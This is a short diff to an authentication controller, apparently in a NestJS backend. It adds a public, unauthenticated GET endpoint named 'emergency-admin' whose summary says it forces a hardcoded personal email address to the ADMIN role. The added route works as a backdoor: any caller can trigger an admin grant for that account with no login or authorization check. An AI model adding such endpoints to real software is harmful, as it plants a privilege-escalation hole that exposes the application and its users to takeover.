@@ -62,6 +62,13 @@ export class AuthController {
         return this.authService.resetPassword(dto.token, dto.newPassword);
     }
 
+    @Public()
+    @Get('emergency-admin')
+    @ApiOperation({ summary: 'Emergency endpoint to force hazarvolga@gmail.com to ADMIN role' })
+    emergencyAdmin() {
+        return this.authService.emergencyAdmin();
+    }
+
     @UseGuards(JwtAuthGuard)
     @Get('me')
     @ApiBearerAuth()
